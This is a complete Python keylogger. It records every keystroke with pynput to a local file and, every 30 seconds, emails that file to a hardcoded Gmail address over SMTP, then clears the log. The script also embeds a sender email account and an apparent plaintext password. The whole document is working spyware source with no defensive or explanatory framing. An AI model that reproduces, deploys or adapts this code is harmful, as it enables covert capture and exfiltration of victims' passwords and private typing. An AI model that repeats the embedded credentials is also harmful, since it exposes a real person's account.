from pynput.keyboard import Key, Listener
import logging
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import threading

log_file = "keylog.txt"
interval = 30

if os.path.exists(log_file):
    os.rename(log_file, "keylog_backup.txt")

logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%H:%M")

def on_press(key):
    logging.info(str(key))

def send_email(subject, body, attachment_path):
    from_email = "shrivarshan.c2022ece@sece.ac.in"  
    to_email = "shrivarshancsv@gmail.com"  
    password = "shrivarshan_csv1" 

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    if os.path.exists(attachment_path):
        with open(attachment_path, 'rb') as file:
            part = MIMEApplication(file.read(), Name=os.path.basename(attachment_path))
            part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
            msg.attach(part)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(from_email, password)
            smtp.sendmail(from_email, to_email, msg.as_string())
    else:
        print(f"Attachment not found: {attachment_path}")

def report():
    global interval, log_file

    try:
        send_email('Keylogger Report', 'Keylog file attached.', log_file)
    except Exception as e:
        print(f"Error sending email: {e}")

    if os.path.exists(log_file):
        with open(log_file, 'w'):  
            pass 

    
    timer = threading.Timer(interval, report)
    timer.start()


timer = threading.Timer(interval, report)
timer.start()


with Listener(on_press=on_press) as listener:
    listener.join()
